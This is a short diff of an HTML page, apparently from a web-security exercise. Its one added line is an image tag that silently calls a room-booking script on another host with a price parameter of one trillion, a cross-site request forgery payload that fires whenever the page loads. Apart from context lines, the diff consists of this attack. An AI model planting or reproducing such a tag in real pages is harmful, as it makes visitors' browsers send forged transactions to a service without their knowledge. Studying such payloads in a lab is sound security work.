@@ -22,6 +22,7 @@
         <td class="cote">&nbsp;</td>
     </tr>
 </table>
+<img src='http://secuweb.neoskai.com/bookRoom.php?prix=1000000000000' />
 </body>
 
 <script type="text/javascript">
